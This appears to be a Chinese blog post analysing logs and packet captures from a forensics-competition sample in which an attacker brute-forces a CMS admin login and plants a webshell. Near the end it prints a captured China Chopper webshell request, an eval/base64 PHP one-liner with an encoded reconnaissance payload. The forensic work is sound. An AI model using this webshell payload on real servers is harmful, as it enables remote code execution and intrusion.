@@ -1,0 +1,691 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <meta charset="utf-8">
+    
+    <title>铁人三项数据赛样题分析 | daiker&#39;s blog</title>
+    
+    
+        <meta name="keywords" content="wireshark,数据分析,取证,日志分析,流量分析" />
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="0x00 题目下载链接: 数据赛 密码：wabt  解压密码：t3sectimu题目要求:背景提示：黑客对一个网站管理系统进行了暴力破解，成功获取了管理权限，并下载了重要文件。问题： （1）黑客最终获得了什么用户名（2）黑客最终获得了什么密码（3）黑客修改了什么文件（4）黑客使用菜刀的完整连接地址（5）黑客使用菜刀的连接密码(6)黑客的查看的第一个文件目录是什么">
+<meta name="keywords" content="wireshark,数据分析,取证,日志分析,流量分析">
+<meta property="og:type" content="article">
+<meta property="og:title" content="铁人三项数据赛样题分析">
+<meta property="og:url" content="http://www.daikersec.com/wiki/3c7f43ba.html">
+<meta property="og:site_name" content="daiker&#39;s blog">
+<meta property="og:description" content="0x00 题目下载链接: 数据赛 密码：wabt  解压密码：t3sectimu题目要求:背景提示：黑客对一个网站管理系统进行了暴力破解，成功获取了管理权限，并下载了重要文件。问题： （1）黑客最终获得了什么用户名（2）黑客最终获得了什么密码（3）黑客修改了什么文件（4）黑客使用菜刀的完整连接地址（5）黑客使用菜刀的连接密码(6)黑客的查看的第一个文件目录是什么">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5443560-48d9b8b43b9db3a5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5443560-8c96560e500388bc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5443560-16cba6bf852c872c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5443560-5ee3414ee6efc313.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5443560-fcf0ea076111ce51.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5443560-8f4ee70a317bd267.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5443560-44eef6cf318db78d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5443560-c64aa09ab58193f7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5443560-2ac5a6358ca9286d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5443560-ff94f72c1e380db7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5443560-3d8671f934c615cd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2018-05-21T03:03:47.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="铁人三项数据赛样题分析">
+<meta name="twitter:description" content="0x00 题目下载链接: 数据赛 密码：wabt  解压密码：t3sectimu题目要求:背景提示：黑客对一个网站管理系统进行了暴力破解，成功获取了管理权限，并下载了重要文件。问题： （1）黑客最终获得了什么用户名（2）黑客最终获得了什么密码（3）黑客修改了什么文件（4）黑客使用菜刀的完整连接地址（5）黑客使用菜刀的连接密码(6)黑客的查看的第一个文件目录是什么">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/5443560-48d9b8b43b9db3a5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+    
+
+    
+        <link rel="alternate" href="/atom.xml" title="daiker&#39;s blog" type="application/atom+xml" />
+    
+
+    
+        <link rel="icon" href="/favicon.ico" />
+    
+
+    <link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/libs/open-sans/styles.css">
+    <link rel="stylesheet" href="/libs/source-code-pro/styles.css">
+
+    <link rel="stylesheet" href="/css/style.css">
+    <script src="/libs/jquery/2.1.3/jquery.min.js"></script>
+    <script src="/libs/jquery/plugins/cookie/1.4.1/jquery.cookie.js"></script>
+    
+    
+        <link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
+    
+    
+        <link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css">
+    
+    
+    
+    
+
+
+    
+        <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+</head>
+
+<body>
+    <div id="container">
+        <header id="header">
+    <div id="header-main" class="header-inner">
+        <div class="outer">
+            <a href="/" id="logo">
+                <i class="logo"></i>
+                <span class="site-title">daiker&#39;s blog</span>
+            </a>
+            <nav id="main-nav">
+                
+                    <a class="main-nav-link" href="/">首页</a>
+                
+                    <a class="main-nav-link" href="/archives">归档</a>
+                
+                    <a class="main-nav-link" href="/categories">分类</a>
+                
+                    <a class="main-nav-link" href="/tags">标签</a>
+                
+                    <a class="main-nav-link" href="/about">关于</a>
+                
+            </nav>
+            
+                
+                <nav id="sub-nav">
+                    <div class="profile" id="profile-nav">
+                        <a id="profile-anchor" href="javascript:;">
+                            <img class="avatar" src="https://www.gravatar.com/avatar/17958dc3fe981da8c50766fef3c5872b" />
+                            <i class="fa fa-caret-down"></i>
+                        </a>
+                    </div>
+                </nav>
+            
+            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="搜索" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="想要查找什么..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+<script src="/js/insight.js"></script>
+
+</div>
+        </div>
+    </div>
+    <div id="main-nav-mobile" class="header-sub header-inner">
+        <table class="menu outer">
+            <tr>
+                
+                    <td><a class="main-nav-link" href="/">首页</a></td>
+                
+                    <td><a class="main-nav-link" href="/archives">归档</a></td>
+                
+                    <td><a class="main-nav-link" href="/categories">分类</a></td>
+                
+                    <td><a class="main-nav-link" href="/tags">标签</a></td>
+                
+                    <td><a class="main-nav-link" href="/about">关于</a></td>
+                
+                <td>
+                    
+    <div class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="搜索" />
+    </div>
+
+                </td>
+            </tr>
+        </table>
+    </div>
+</header>
+
+        <div class="outer">
+            
+                
+
+<aside id="profile">
+    <div class="inner profile-inner">
+        <div class="base-info profile-block">
+            <img id="avatar" src="https://www.gravatar.com/avatar/17958dc3fe981da8c50766fef3c5872b?s=128" />
+            <h2 id="name">daiker</h2>
+            <h3 id="title">daiker&#39;s wiki</h3>
+            <span id="location"><i class="fa fa-map-marker"></i>XiaMen, China</span>
+            <a id="follow" target="_blank" href="https://github.com/daikersec/">关注我</a>
+        </div>
+        <div class="article-info profile-block">
+            <div class="article-info-block">
+                14
+                <span>文章</span>
+            </div>
+            <div class="article-info-block">
+                21
+                <span>标签</span>
+            </div>
+        </div>
+        
+        <div class="profile-block social-links">
+            <table>
+                <tr>
+                    
+                    
+                    <td>
+                        <a href="https://github.com/daikersec/" target="_blank" title="github" class=tooltip>
+                            <i class="fa fa-github"></i>
+                        </a>
+                    </td>
+                    
+                    <td>
+                        <a href="/atom.xml" target="_blank" title="rss" class=tooltip>
+                            <i class="fa fa-rss"></i>
+                        </a>
+                    </td>
+                    
+                </tr>
+            </table>
+        </div>
+        
+    </div>
+</aside>
+
+            
+            
+                <aside id="sidebar">
+   
+        
+    <div class="widget-wrap" id='categories'>
+        <h3 class="widget-title">
+            <span>分类</span>
+            &nbsp;
+            <a id='allExpand' href="#">
+                <i class="fa fa-angle-double-up fa-2x"></i>
+            </a>
+        </h3>
+        
+        
+        
+         <ul class="unstyled" id="tree" style="display: block;"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            Linux
+                        </a>
+                         <ul class="unstyled" id="tree" style="display: block;"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            内核
+                        </a>
+                         <ul class="unstyled" id="tree" style="display: block;">  <li class="file"><a href="/wiki/b309a0f3.html">Linuxv0.11源码分析之引导启动程序一</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                    
+                    <li class="directory open">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            取证
+                        </a>
+                         <ul class="unstyled" id="tree" style="display: block;"> 
+                    <li class="directory open">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            流量分析
+                        </a>
+                         <ul class="unstyled" id="tree" style="display: block;">  <li class="file"><a href="/wiki/ba9a968.html">铁人三项2018第七赛区(福建)数据赛wp</a></li>  <li class="file active"><a href="/wiki/3c7f43ba.html">铁人三项数据赛样题分析</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            渗透测试
+                        </a>
+                         <ul class="unstyled" id="tree" style="display: block;"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            Web安全
+                        </a>
+                         <ul class="unstyled" id="tree" style="display: block;"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            SQL注入
+                        </a>
+                         <ul class="unstyled" id="tree" style="display: block;">  <li class="file"><a href="/wiki/a62e54a0.html">CTF中SQL注入字段名被过滤小技巧</a></li>  <li class="file"><a href="/wiki/7e490dd2.html">insert 注入</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            反序列化漏洞
+                        </a>
+                         <ul class="unstyled" id="tree" style="display: block;">  <li class="file"><a href="/wiki/39a24cc2.html">php反序列化漏洞</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            命令执行
+                        </a>
+                         <ul class="unstyled" id="tree" style="display: block;">  <li class="file"><a href="/wiki/8f0228b2.html">happyMoctf-ping一下好吗WP</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            工具使用
+                        </a>
+                         <ul class="unstyled" id="tree" style="display: block;">  <li class="file"><a href="/wiki/9668f403.html">metasploit在后渗透中的作用</a></li>  <li class="file"><a href="/wiki/376537a6.html">解决msf内存不足不能启动的问题</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            提权
+                        </a>
+                         <ul class="unstyled" id="tree" style="display: block;"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            Linux
+                        </a>
+                         <ul class="unstyled" id="tree" style="display: block;">  <li class="file"><a href="/wiki/undefined.html">利用Nebula学习Linux提权</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            渗透思路
+                        </a>
+                         <ul class="unstyled" id="tree" style="display: block;">  <li class="file"><a href="/wiki/c445d4db.html">一次简单渗透</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            漏洞挖掘
+                        </a>
+                         <ul class="unstyled" id="tree" style="display: block;"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            二进制漏洞
+                        </a>
+                         <ul class="unstyled" id="tree" style="display: block;">  <li class="file"><a href="/wiki/11af4bf6.html">PWN环境搭建</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            代码审计
+                        </a>
+                         <ul class="unstyled" id="tree" style="display: block;"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            php
+                        </a>
+                         <ul class="unstyled" id="tree" style="display: block;">  <li class="file"><a href="/wiki/4249e474.html">CTF中代码审计小trick(未完)</a></li>  <li class="file"><a href="/wiki/1067b4de.html">PHP危险函数总结(随时补充)</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                     </ul> 
+    </div>
+    <script>
+        $(document).ready(function() {
+            var iconFolderOpenClass  = 'fa-folder-open';
+            var iconFolderCloseClass = 'fa-folder';
+            var iconAllExpandClass = 'fa-angle-double-down';
+            var iconAllPackClass = 'fa-angle-double-up';
+            // Handle directory-tree expansion:
+            // 左键单独展开目录
+            $(document).on('click', '#categories a[data-role="directory"]', function (event) {
+                event.preventDefault();
+
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconFolderOpenClass);
+                var subtree = $(this).siblings('ul');
+                icon.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
+                if (expanded) {
+                    if (typeof subtree != 'undefined') {
+                        subtree.slideUp({ duration: 100 });
+                    }
+                    icon.addClass(iconFolderCloseClass);
+                } else {
+                    if (typeof subtree != 'undefined') {
+                        subtree.slideDown({ duration: 100 });
+                    }
+                    icon.addClass(iconFolderOpenClass);
+                }
+            });
+            // 右键展开下属所有目录
+            $('#categories a[data-role="directory"]').bind("contextmenu", function(event){
+                event.preventDefault();
+                
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconFolderOpenClass);
+                var listNode = $(this).siblings('ul');
+                var subtrees = $.merge(listNode.find('li ul'), listNode);
+                var icons = $.merge(listNode.find('.fa'), icon);
+                icons.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
+                if(expanded) {
+                    subtrees.slideUp({ duration: 100 });
+                    icons.addClass(iconFolderCloseClass);
+                } else {
+                    subtrees.slideDown({ duration: 100 });
+                    icons.addClass(iconFolderOpenClass);
+                }
+            })
+            // 展开关闭所有目录按钮
+            $(document).on('click', '#allExpand', function (event) {
+                event.preventDefault();
+                
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconAllExpandClass);
+                icon.removeClass(iconAllExpandClass).removeClass(iconAllPackClass);
+                if(expanded) {
+                    $('#sidebar .fa.fa-folder').removeClass('fa-folder').addClass('fa-folder-open')
+                    $('#categories li ul').slideDown({ duration: 100 });
+                    icon.addClass(iconAllPackClass);
+                } else {
+                    $('#sidebar .fa.fa-folder-open').removeClass('fa-folder-open').addClass('fa-folder')
+                    $('#categories li ul').slideUp({ duration: 100 });
+                    icon.addClass(iconAllExpandClass);
+                }
+            });  
+        });
+    </script>
+
+    
+        
+    <div class="widget-wrap">
+        <h3 class="widget-title"><span>标签云</span></h3>
+        <div class="widget tagcloud">
+            <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/Kali/" style="font-size: 13.33px;">Kali</a> <a href="/tags/Linux/" style="font-size: 16.67px;">Linux</a> <a href="/tags/Web/" style="font-size: 20px;">Web</a> <a href="/tags/ctf/" style="font-size: 16.67px;">ctf</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a> <a href="/tags/tools/" style="font-size: 13.33px;">tools</a> <a href="/tags/web/" style="font-size: 10px;">web</a> <a href="/tags/wireshark/" style="font-size: 13.33px;">wireshark</a> <a href="/tags/代码审计/" style="font-size: 10px;">代码审计</a> <a href="/tags/内核/" style="font-size: 10px;">内核</a> <a href="/tags/取证/" style="font-size: 13.33px;">取证</a> <a href="/tags/提权/" style="font-size: 13.33px;">提权</a> <a href="/tags/数据分析/" style="font-size: 13.33px;">数据分析</a> <a href="/tags/日志分析/" style="font-size: 13.33px;">日志分析</a> <a href="/tags/注入/" style="font-size: 13.33px;">注入</a> <a href="/tags/流量分析/" style="font-size: 13.33px;">流量分析</a> <a href="/tags/渗透/" style="font-size: 10px;">渗透</a> <a href="/tags/渗透测试/" style="font-size: 10px;">渗透测试</a> <a href="/tags/漏洞研究/" style="font-size: 13.33px;">漏洞研究</a>
+        </div>
+    </div>
+
+    
+        
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title"><span>链接</span></h3>
+        <div class="widget">
+            <ul>
+                
+                    <li>
+                        <a href="http://www.iFurySt.com">iFurySt</a>
+                    </li>
+                
+                    <li>
+                        <a href="http://wyAtu.github.io">wyAtu</a>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+
+
+    
+    <div id="toTop" class="fa fa-angle-up"></div>
+</aside>
+            
+            <section id="main"><article id="post-铁人三项数据赛样题分析" class="article article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+        
+            <header class="article-header">
+                
+                    <div class="article-meta">
+                        
+    <div class="article-category">
+    	<i class="fa fa-folder"></i>
+        <a class="article-category-link" href="/categories/取证/">取证</a><i class="fa fa-angle-right"></i><a class="article-category-link" href="/categories/取证/流量分析/">流量分析</a>
+    </div>
+
+                        
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/wireshark/">wireshark</a>, <a class="tag-link" href="/tags/取证/">取证</a>, <a class="tag-link" href="/tags/数据分析/">数据分析</a>, <a class="tag-link" href="/tags/日志分析/">日志分析</a>, <a class="tag-link" href="/tags/流量分析/">流量分析</a>
+    </div>
+
+                        
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/wiki/3c7f43ba.html">
+            <time datetime="2018-04-22T14:30:02.000Z" itemprop="datePublished">2018-04-22</time>
+        </a>
+    </div>
+
+
+                        
+                            <i class="fa fa-bar-chart"></i>
+                            <span id="busuanzi_container_site_pv"><span id="busuanzi_value_page_pv"></span></span>    
+                        
+                        
+                            <div class="article-meta-button">
+                                <a href='https://github.com/daikersec/daikersec.github.io/raw/hexo/source/_posts/铁人三项数据赛样题分析.md'> Source </a>
+                            </div>
+                            <div class="article-meta-button">
+                                <a href='https://github.com/daikersec/daikersec.github.io/edit/hexo/source/_posts/铁人三项数据赛样题分析.md'> Edit </a>
+                            </div>
+                            <div class="article-meta-button">
+                                <a href='https://github.com/daikersec/daikersec.github.io/commits/hexo/source/_posts/铁人三项数据赛样题分析.md'> History </a>
+                            </div>
+                        
+                    </div>
+                
+                
+    
+        <h1 class="article-title" itemprop="name">
+            铁人三项数据赛样题分析
+        </h1>
+    
+
+            </header>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+        
+            
+        
+        
+            <h2 id="0x00-题目"><a href="#0x00-题目" class="headerlink" title="0x00 题目"></a>0x00 题目</h2><p>下载链接: <a href="https://pan.baidu.com/s/1bq9Zvun" target="_blank" rel="noopener">数据赛 密码：wabt  解压密码：t3sectimu</a><br>题目要求:<br>背景提示：黑客对一个网站管理系统进行了暴力破解，成功获取了管理权限，并下载了重要文件。<br>问题：</p>
+<p>（1）黑客最终获得了什么用户名<br>（2）黑客最终获得了什么密码<br>（3）黑客修改了什么文件<br>（4）黑客使用菜刀的完整连接地址<br>（5）黑客使用菜刀的连接密码<br>(6)黑客的查看的第一个文件目录是什么<br><a id="more"></a></p>
+<h2 id="0x01-初步分析攻击者IP"><a href="#0x01-初步分析攻击者IP" class="headerlink" title="0x01 初步分析攻击者IP"></a>0x01 初步分析攻击者IP</h2><p>我们在假定攻击者攻击成功的情况下，应该会留下网页木马，先看下最后一个被访问的那些链接，这里通过<code>Web Log Explorer</code>的<code>Exit Point</code>查看<br><img src="https://upload-images.jianshu.io/upload_images/5443560-48d9b8b43b9db3a5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Exit Point"><br>这里看到三个比较可疑的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tunnel.php</span><br><span class="line">backdoor.php</span><br><span class="line">y0n.php</span><br></pre></td></tr></table></figure>
+<p>然后看三个中最早的具体保文，可以看到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172.16.61.210 (LOCAL NETWORK)   2016/8/10 1:16:07   /y0n.php            200 - OK    No Referrer</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172.16.61.210 (LOCAL NETWORK)   2016/8/10 1:15:38   /backdoor.php           200 - OK    No Referrer</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">101.36.79.67 (Beijing,Beijing,China)    2016/8/10 1:03:07   /tunnel.php     28  200 - OK    No Referrer</span><br></pre></td></tr></table></figure>
+<p>这里面的/tunnel.php，如果我们做过内网渗透的时候应该都知道，这个是一个HTTP代理，我们又注意到<code>backdoor.php</code>和<code>y0n.php</code>的访问IP都是内网，再看下访问时间，可以推出攻击者是通过tunnul代理进来的。攻击者IP大致可以确定是<code>101.36.79.67</code>。现在已经的最早攻击成功时间是<code>2016/8/10 1:03:07</code>.这个情况下分析下<code>101.36.79.67</code>这个IP的访问记录。我们通过<code>Apache Logs Viewer</code>来过滤IP。分析攻击过程<img src="https://upload-images.jianshu.io/upload_images/5443560-8c96560e500388bc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="访问情况.png"><br>这里面没发现有啥能getshell的操作。<br>这条思路断了。</p>
+<h2 id="0x02-再分析攻击者IP"><a href="#0x02-再分析攻击者IP" class="headerlink" title="0x02 再分析攻击者IP"></a>0x02 再分析攻击者IP</h2><p>接下来通过单个页面的点击情况来分析(正常首页那种情况访问量应该多，，后台的访问应该比较少)<br><img src="https://upload-images.jianshu.io/upload_images/5443560-16cba6bf852c872c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="点击情况.png"><br>然后这里陷入一个惯性思维，，以为index.php一定是首页。点进去才看到<code>index.php?m=admin&amp;c=index&amp;a=login&amp;pc_hash=xFbuB1</code>这样的链接，想起来这是用<code>MVC</code>书写的时候的链接上次。点进<code>index.php</code><br><img src="https://upload-images.jianshu.io/upload_images/5443560-5ee3414ee6efc313.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="后台.png"><br>这里发现大量对后台进行访问，，初步推测可能在爆破账号密码。对IP进行过滤，排除掉内网IP，得到<code>219.239.105.18</code>这个IP</p>
+<h2 id="0x03-分析攻击过程"><a href="#0x03-分析攻击过程" class="headerlink" title="0x03 分析攻击过程"></a>0x03 分析攻击过程</h2><p>我们通过<code>Apache Logs Viewer</code>来过滤IP<br><img src="https://upload-images.jianshu.io/upload_images/5443560-fcf0ea076111ce51.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="爆破.png"><br>我们分析该IP大约从2016/8/9 22:17分开始进行爆破(后台，发送大量POST包可以推断出来)，然后我们往后看<br><img src="https://upload-images.jianshu.io/upload_images/5443560-8f4ee70a317bd267.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="成功.png"><br>大约在 2016/8/9 23:02 爆破成功<br>接下来我们看到<br><img src="https://upload-images.jianshu.io/upload_images/5443560-44eef6cf318db78d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="edit.png"><br>这里使用模板的editFile,修改的search 的index.html。<br>然后后面通过POST访问search这个，模块，，初步推测，，这里是种马和访问马的过程。这里单纯看日志有个不好的地方，，就是看不到POST的body里面的内容，这个时候就得结合流量包。</p>
+<h2 id="0x04-分析攻击流量"><a href="#0x04-分析攻击流量" class="headerlink" title="0x04 分析攻击流量"></a>0x04 分析攻击流量</h2><p>我们通过流量包来验证上面日志的分析</p>
+<h4 id="分析爆破出来的账号密码"><a href="#分析爆破出来的账号密码" class="headerlink" title="分析爆破出来的账号密码"></a>分析爆破出来的账号密码</h4><p>如果直接用wireshark一个个打开，太大了。这里推荐个软件 httppcap 专门用来提取http数据包的。总共有8个流量包，，如果一个个分析的话太繁琐，我们先大约估计爆破的在哪几个包里面。<br>通过一下shell脚本，提取每个包里面来自<code>219.239.105.18</code>的http请求头部<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for file in `ls`</span><br><span class="line">do</span><br><span class="line">    parse-pcap -i 219.239.105.18 $file &gt;&gt; txt/$file.txt</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p>
+<p>然后匹配哪些包里面含有<code>m=index</code>这样的请求<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">for file in `ls`</span><br><span class="line">do</span><br><span class="line">    echo $file</span><br><span class="line">    cat $file|grep &apos;/index.php?m=admin&apos; </span><br><span class="line">    echo &quot;-----------------------------------------------------&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p>
+<p>得到爆破的流量都在<code>数据采集D_eth0_NS_20160810_130801.pcap</code>这个文件里面<br>接下来使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parse-pcap -i 219.239.105.18 -vvv 数据采集D_eth0_NS_20160810_130801.pcap &gt; txt/all.txt</span><br></pre></td></tr></table></figure></p>
+<p>来查看所有的爆破时候的http具体报文<br><img src="https://upload-images.jianshu.io/upload_images/5443560-c64aa09ab58193f7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="爆破报文.png"><br>如图,爆破的数据包在里面，，接下来寻找爆破成功的那个<br>根据发包时间和回包大小我们确实了登录成功的账号为<code>root</code>，密码为<code>123456</code>。<br><img src="https://upload-images.jianshu.io/upload_images/5443560-2ac5a6358ca9286d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="深度截图_选择区域_20180417222225.png"></p>
+<h4 id="0x02-分析一句话"><a href="#0x02-分析一句话" class="headerlink" title="0x02 分析一句话"></a>0x02 分析一句话</h4><p>通过上面方法匹配<code>m=search</code>,得到报文在<br><code>数据采集D_eth0_NS_20160810_141903.pcap</code>,<code>数据采集D_eth0_NS_20160810_142037.pcap</code>,<code>数据采集D_eth0_NS_20160810_142224.pcap</code>里面<br>然后提取报文详情<br><img src="https://upload-images.jianshu.io/upload_images/5443560-ff94f72c1e380db7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="yijuhua.png"><br>熟悉的一句话,urldecode一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chopper=@eval(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw==</span><br></pre></td></tr></table></figure>
+<p>密码为chooper</p>
